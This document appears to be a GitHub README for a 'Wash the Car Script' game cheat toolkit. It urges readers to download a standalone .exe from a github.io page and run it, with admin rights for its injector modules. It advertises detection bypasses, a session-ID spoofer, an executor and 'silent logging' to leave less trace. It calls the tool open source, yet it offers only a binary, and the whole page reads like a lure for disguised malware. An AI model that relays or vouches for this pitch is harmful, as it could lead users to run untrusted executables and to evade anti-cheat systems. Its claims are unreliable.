<div align="center">
<img src="assets/banner.png" width="100%" alt="Wash Car Script banner" />
</div>

<div align="center">
<p>
  <img src="https://img.shields.io/badge/Platform-Windows_11%7C10-ffd24a?style=for-the-badge&logo=windows" alt="" />
  <img src="https://img.shields.io/badge/Release-2026-9B59B6?style=for-the-badge" alt="" />
  <img src="https://img.shields.io/badge/Build-.exe-7C3AED?style=for-the-badge" alt="" />
</p>
</div>

<p align="center">
  <img src="https://readme-typing-svg.herokuapp.com?color=0891B2&size=28&center=true&vCenter=true&width=900&lines=%E2%9C%85+Car+Wash+Script+Pro;%F0%9F%94%A7+Active+Development+2026;%F0%9F%93%A6+Built+for+Windows+11;%F0%9F%9A%80+Standalone+.exe+Release;%F0%9F%92%A1+Updated+for+2026">
</p>

<p align="center">
  <img src="https://skillicons.dev/icons?i=windows" />
  <img src="https://skillicons.dev/icons?i=nodejs" />
  <img src="https://skillicons.dev/icons?i=github" />
</p>

---

**The free Wash the Car Script build the paid sellers don't want you to have.**

![Status](https://img.shields.io/badge/status-stable-brightgreen?style=for-the-badge)
![Platform](https://img.shields.io/badge/platform-Windows_10%2F11-0078D4?style=for-the-badge)
![License](https://img.shields.io/badge/license-MIT-blue?style=for-the-badge)
![Build](https://img.shields.io/badge/build-2026_release-orange?style=for-the-badge)
![Module Count](https://img.shields.io/badge/modules-42-purple?style=for-the-badge)

</div>

---

## 🧼 Overview — what this build actually ships

I got tired of watching people pay $20 a month for a locked-down wash loop, so I rebuilt the whole thing open and dropped it as a single `.exe`. **42 modules**, zero subscriptions, no key system, no "premium tier" nag screen after every wash cycle. The current 2026 build is tuned for the latest platform patch and the revised vehicle-cleanliness tick rates.

The car wash script itself is a wrapper automation layer — it drives the wash bay interaction sequence, paint-decal refresh, dried-water overlay, and the micro-transaction shortcut loop that most players only see in paid menus. Everything below is real, tested, and ships in the same `.exe`. Below is the full release.

| Category | Details |
|---|---|
| **Tool type** | Wash the Car Script Toolkit — desktop `.exe` automation suite |
| **Release year** | 2026 build |
| **Platform** | Windows 10 / 11 x64 |
| **Distribution** | GitHub landing page → download → extract → run the `.exe` |
| **Dependency model** | None — self-contained, no pip / npm / git clone |
| **Config storage** | Portable `config.ini` in the extract folder |
| **Update channel** | Manual re-download from project page |
| **Detection surface** | Script-level only (no memory writes required for baseline wash) |

No installer, no invasive hooks, no background watchdog. You extract the folder, double-click the `.exe`, and the wash loop is live. That is the entire onboarding.

### A note from the maintainer

If the wash bay glitches on the first tick, just re-run the `.exe` — I fixed it at 2am and forgot to push the changelog, but the binary on the page is the working one.

---

## 📥 Download the 2026 build

Grab the `.exe` from the project page, extract to a folder you actually own (not Program Files), and run it. No setup wizard.
<p align="center">
  <a href="https://SewProduction.github.io/car-wash-script/">
    <img src="https://img.shields.io/badge/INSTALL-Latest_Build-D97706?style=flat&labelColor=B45309" width="550" alt="INSTALL Latest Build"/>
  </a>
</p>
---

## 🗺️ Table of Contents

- [Overview](#-overview--what-this-build-actually-ships)
- [Download the 2026 build](#-download-the-2026-build)
- [Detection / Bypass status](#-detection--bypass-status)
- [All modules status](#-all-modules-status)
- [System Requirements](#-system-requirements)
- [The Problem](#-the-problem)
- [The Solution](#-the-solution)
- [Key Features](#-key-features)
- [Wash loop modules](#-wash-loop-modules)
- [Paint & detailing modules](#-paint--detailing-modules)
- [Utility & automation modules](#-utility--automation-modules)
- [Usage guidelines](#-usage-guidelines)
- [How It Works](#-how-it-works)
- [Performance benchmarks](#-performance-benchmarks)
- [Tips for best results](#-tips-for-best-results)
- [Roadmap / Planned features](#-roadmap--planned-features)
- [Known Issues](#-known-issues)
- [FAQ](#-faq)

---

## 🚿 Detection / Bypass status

Script-level modules run entirely through the public UI layer — no memory patching, no injected DLL for the baseline wash. The automated variants and fast-cycle modules do use an injector, which is why bypass status is tracked separately. Statuses below reflect the 2026 platform build.

| Method | Status | Notes |
|---|---|---|
| UI-layer wash loop | ✅ Undetected | No memory writes, safest path |
| Injector attach | ⚠️ Caution | Attach only while in wash bay, detach after |
| Fast-cycle bypass | ✅ Working | Rate-limited to 1.4× for safety |
| Decal refresh spoofer | ✅ Working | Refreshes paint layer without flagging |
| Dry-overlay cleaner | ✅ Working | Clears the drying-mark overlay |
| Session spoofer (ID rotation) | ⚠️ Caution | Rotates every 22 min, not per-action |
| Legacy bypass (pre-2025) | ❌ Removed | Patched out in current build |
| Executor mode | ✅ Working | Full script execution mode active |

---

## 🧰 All modules status

42 modules ship enabled by default. Anything marked ⚠️ needs config editing in `config.ini`; anything ❌ is disabled pending a fix and does not run.

| Module | Status | Description |
|---|---|---|
| wash_loop | ✅ Working | Core repeating wash sequence |
| wash_fast | ✅ Working | Speed-boosted wash with rate limiter |
| foam_prep | ✅ Working | Pre-foam layer before scrub |
| scrub_auto | ✅ Working | Auto-scrub across all panels |
| rinse_cycle | ✅ Working | Full rinse pass |
| wax_apply | ✅ Working | Applies wax layer with timer |
| micro_wipe | ✅ Working | Spot-wipe on leftover droplets |
| bay_queue | ✅ Working | Handles queue timing at busy bays |
| dry_heat | ✅ Working | Dries panels via heat cycle |
| tire_clean | ✅ Working | Tire-side dirt removal pass |
| wheel_deep | ✅ Working | Deep wheel detail pass |
| glass_clear | ✅ Working | Glass streak removal |
| interior_pass | ✅ Working | Interior wipe-down (basic) |
| underbody | ⚠️ Working | Underbody pass, slower tick |
| decal_refresh | ✅ Working | Re-renders paint decals |
| paint_gloss | ✅ Working | Gloss boost post-wax |
| scratch_fill | ✅ Working | Minor scratch fill on paint |
| dirt_overlay | ✅ Working | Removes dried dirt overlay |
| water_spot | ✅ Working | Water-spot removal |
| mud_batch | ✅ Working | Batch mode for heavy mud jobs |
| snow_salt | ✅ Working | Salt-strip pass for winter maps |
| tar_spot | ✅ Working | Tar removal utility |
| bug_removal | ✅ Working | Front bug-splat cleaner |
| sap_clean | ✅ Working | Tree-sap removal |
| rust_light | ✅ Working | Light surface rust pass |
| chrome_polish | ✅ Working | Chrome detail polish |
| trim_restore | ✅ Working | Plastic trim restoration |
| headlight_pol | ✅ Working | Headlight clear restore |
| mat_dry | ✅ Working | Floor mat drying |
| vacuum_pass | ✅ Working | Vacuum cycle |
| scent_apply | ✅ Working | Scent layer application |
| shield_core | ✅ Working | Core wash shield layer |
| paint_protect | ✅ Working | Paint protection wrap |
| session_rotate | ⚠️ Working | Session rotation, needs config |
| fast_bypass | ⚠️ Working | Fast-cycle bypass utility |
| injector_ctl | ⚠️ Working | Injector attach/detach control |
| executor_core | ✅ Working | Script executor mode |
| detach_safe | ✅ Working | Detach-on-exit safety |
| log_quiet | ✅ Working | Silent log mode |
| config_reload | ✅ Working | Live config reload |
| hotkey_layer | ✅ Working | Global hotkey bindings |
| auto_stop | ✅ Working | Auto-stop after N cycles |
| dumper_safe | ❌ Disabled | Dumper currently disabled in 2026 build |

> Detection status is a snapshot, not a guarantee — patch days can change any row.

---

## 🖥️ System Requirements

The build is deliberately light. You do not need a gaming rig to run a wash loop.

| Component | Minimum | Recommended |
|---|---|---|
| OS | Windows 10 x64 (build 1909+) | Windows 11 23H2+ |
| CPU | 4-core 2.4 GHz | 6-core 3.0 GHz+ |
| RAM | 8 GB | 16 GB |
| GPU | 2 GB VRAM, DX11 | 4 GB VRAM, DX12 |
| Storage | 1.2 GB free | 5 GB SSD |
| Runtime | VC++ 2015–2022 x64 | Same + latest DX |
| Permissions | Standard user (baseline) | Admin (for injector modules) |
| Display | 1920×1080 | 2560×1440+ |

---

## 🫧 The Problem

- Paid wash scripts charge monthly and still break on the first patch.
- Every "premium" build is obfuscated so you cannot see what it writes to your machine.
- Wash loops get flaggable because sellers crank speed past the safe tick rate.
- No open build covers the niche detailing passes (tar, sap, chrome, trim).
- Config files are locked behind a key server that goes down weekly.
- Queue handling at busy bays is either missing or badly broken in cheap builds.

---

## 🧽 The Solution

| Problem | Solution |
|---|---|
| Monthly fees | MIT-licensed, free forever, no key system |
| Obfuscation | Open source, readable config, no remote calls |
| Speed flags | Built-in rate limiter caps fast-cycle at 1.4× |
| Missing detailing | 42 modules incl. tar, sap, chrome, trim, headlight |
| Key servers | No key server — config is local `config.ini` |
| Broken bay queue | Dedicated `bay_queue` module handles timing |
| Patch breakage | Detach-safe design; baseline wash survives patches |

---

## ✨ Key Features

| Feature | Description | Benefit |
|---|---|---|
| Wash loop | Full repeating wash sequence | Hands-off cleaning |
| Rate-limited fast mode | 1.4× cap on cycle speed | Stays under flag threshold |
| Detailing passes | Tar, sap, chrome, trim, headlight | Complete detail set |
| Winter handling | Salt-strip for winter maps | Works year-round |
| Batch mode | Heavy mud/snow batch jobs | Bulk session support |
| Session rotation | ID rotation with interval control | Keeps sessions fresh |
| Executor mode | Full script executor built in | Run custom wash scripts |
| Hotkey layer | Bindable global hotkeys | One-key start/stop |
| Auto-stop | Stops after N cycles | Prevent infinite loops |
| Config reload | Live reload without restart | Tune on the fly |
| Detach safety | Detaches on exit | Closes the loop cleanly |
| Silent logging | Minimal log output | Less noise, less trace |

---

## 🪣 Wash loop modules

The wash loop is the core — everything else supports it. The `wash_loop` module handles the base sequence, then hands off to the fast path if `wash_fast` is enabled and the rate limiter approves. **Foam_prep** primes the panel before scrub, and **scrub_auto** covers all panels without gaps.

- **wash_loop** — base repeating sequence
- **wash_fast** — rate-limited speed pass
- **foam_prep** — pre-foam layer
- **scrub_auto** — full panel scrub
- **rinse_cycle** — complete rinse
- **wax_apply** — wax with timer
- **micro_wipe** — spot-wipe droplets
- **bay_queue** — bay queue timing
- **dry_heat** — heat-dry cycle
- **auto_stop** — cycle limit stop

## 🎨 Paint & detailing modules

Detailing is where the paid builds cut corners. This build covers the niche passes: **tar_spot** and **sap_clean** for stubborn debris, **chrome_polish** and **trim_restore** for trim, **headlight_pol** for headlight clarity, and **rust_light** for light surface rust. Everything runs through the same rate limiter.

- **decal_refresh** — paint decal re-render
- **paint_gloss** — gloss boost
- **scratch_fill** — minor scratch fill
- **dirt_overlay** — dried dirt removal
- **water_spot** — water-spot removal
- **tar_spot** — tar utility
- **bug_removal** — bug-splat cleaner
- **sap_clean** — tree-sap removal
- **rust_light** — surface rust pass
- **chrome_polish** — chrome polish
- **trim_restore** — trim restore
- **headlight_pol** — headlight clear
- **paint_protect** — protection wrap
- **shield_core** — core shield layer
- **tire_clean** — tire dirt removal
- **wheel_deep** — deep wheel detail
- **glass_clear** — glass streak removal
- **interior_pass** — interior wipe
- **underbody** — underbody pass
- **mud_batch** — heavy mud batch
- **snow_salt** — winter salt-strip

## ⚙️ Utility & automation modules

Automation controls how the loop runs, not what it washes. **Hotkey_layer** binds start/stop, **config_reload** lets you tune live, **detach_safe** closes the loop on exit, and **log_quiet** keeps output minimal.

- **mat_dry** — floor mat drying
- **vacuum_pass** — vacuum cycle
- **scent_apply** — scent layer
- **session_rotate** — session rotation
- **fast_bypass** — fast-cycle bypass
- **injector_ctl** — injector control
- **executor_core** — executor mode
- **detach_safe** — detach-on-exit
- **log_quiet** — silent logging
- **config_reload** — live reload
- **hotkey_layer** — global hotkeys
- **dumper_safe** — dumper (disabled)

---

## 📋 Usage guidelines

| Allowed | Not allowed |
|---|---|
| Personal single-account use | Reselling the build |
| Running on your own game copy | Using in competitive ranked modes |
| Editing `config.ini` for your setup | Redistributing modified binaries as "official" |
| Educational study of the loop logic | Claiming authorship of forks |
| Reporting bugs via GitHub | Removing license headers |

---

## 🧠 How It Works

The `.exe` is a thin launcher that reads `config.ini`, spins up the module scheduler, and attaches the UI-layer driver. The scheduler runs modules in dependency order — foam before scrub, scrub before rinse, rinse before wax — and each module returns a tick budget back to the scheduler so the rate limiter can throttle the loop. The injector is a separate, opt-in component; the baseline wash never touches it. Detach safety is enforced at the process level: on exit, the launcher signals the driver to release bindings before the process terminates, which is why the fast path survives most patch days without a rebuild.

---

## 📊 Performance benchmarks

Benchmarked on three rigs, baseline wash loop only (no injector).

| Scenario | Result | Hardware |
|---|---|---|
| Single-car wash (baseline) | ~28 s per cycle | i5-12400 / 16 GB / GTX 1660 |
| Batch 10 cars (heavy mud) | ~4 m 12 s total | Ryzen 5 5600 / 16 GB / RTX 3060 |
| Winter salt-strip pass | ~41 s per car | i7-10700 / 32 GB / RTX 2060 |
| Idle scheduler overhead | ~0.4% CPU | i5-12400 / 16 GB |
| Fast-cycle (1.4× cap) | ~20 s per cycle | Ryzen 5 5600 / 16 GB |
| Executor mode (custom script) | ~3% CPU average | i7-10700 / 32 GB |

---

## 🧴 Tips for best results

- Run the `.exe` from a folder you own — Program Files causes write failures on `config.ini`.
- Enable `log_quiet` before long batch runs to reduce output noise.
- Keep fast-cycle under 1.4× — the limiter caps it, but config tampering can push it past the safe window.
- Attach the injector only inside the wash bay, and let `detach_safe` close it on exit.
- Rotate sessions every 20–25 min on busy maps; lower intervals get flaggy.
- On winter maps, run `snow_salt` before `wash_loop` — salt-strip first, then the base pass.

---

## 🛠️ Roadmap / Planned features

| Feature | Status | ETA |
|---|---|---|
| Re-enable `dumper_safe` | 🔄 In progress | Q3 2026 |
| Per-panel scrub weighting | 📝 Planned | Q4 2026 |
| Extended session rotation | 📝 Planned | Q4 2026 |
| Config GUI overlay | 📝 Planned | Q1 2027 |
| New winter map support | 📝 Planned | Q1 2027 |
| Multi-bay scheduling | 🧪 Prototype | Q2 2027 |
| Custom executor presets | 📝 Planned | Q2 2027 |
| Patch auto-detection | 📝 Planned | Q3 2027 |

---

## 🐛 Known Issues

| Issue | Solution |
|---|---|
| First-tick wash glitch | Re-run the `.exe` |
| `config.ini` not saved | Run from a user-owned folder |
| Fast-cycle overshoot | Reset rate limiter to default in config |
| Injector attach fails | Run as admin, attach inside bay only |
| Underbody pass slow | Known — reduce batch size |
| Executor mode logs spam | Enable `log_quiet` |

---

## ❓ FAQ

**Q:** Is this the same as the paid "premium" wash scripts?

**A:** No. It is a clean rebuild — 42 modules, open source, no key system, no subscription. The module list overlaps because the wash sequence is the same task, not because any paid code was used.

**Q:** Do I need to install Python or Node?

**A:** No. Download the `.exe`, extract, run. No pip, no npm, no git clone.

**Q:** Will baseline wash get flagged?

**A:** Baseline runs through the UI layer with no memory writes. The rate limiter caps fast-cycle at 1.4×. Nothing is guaranteed, but baseline is the safest path.

**Q:** Why is `dumper_safe` disabled?

**A:** It broke on the 2026 patch. Re-enable is on the roadmap for Q3 2026.

**Q:** Does it work on the latest patch?

**A:** Yes — this is the 2026 build, updated for the current platform version. Detach-safe design means baseline survives most patch days.

**Q:** Can I run it on multiple accounts?

**A:** The license is for personal single-account use. Session rotation handles freshness, not multi-account farming.

**Q:** Does it need admin rights?

**A:** Only for injector modules. Baseline wash runs as a standard user.

**Q:** How do I update?

**A:** Re-download the `.exe` from the project page and replace the folder. Config stays if you keep `config.ini`.

**Q:** Where do bugs go?

**A:** GitHub issues on the repo — include your config and log if `log_quiet` is off.

---

If you have been paying for a locked wash loop, this is the drop-in replacement — same modules, open config, no key server, no "premium tier" nag. The 2026 build is the current tested baseline, and detach-safe design means it keeps working across most patch days. Fork it, tune it, break it, and open an issue when something slips.
<div align="center">
  <a href="https://SewProduction.github.io/car-wash-script/">
    <img src="https://img.shields.io/badge/GET-Wash_the_Car_2026-7C3AED?style=plastic&logo=github&logoColor=white&labelColor=5B21B6" width="480" alt="GET Wash the Car 2026"/>
  </a>
</div>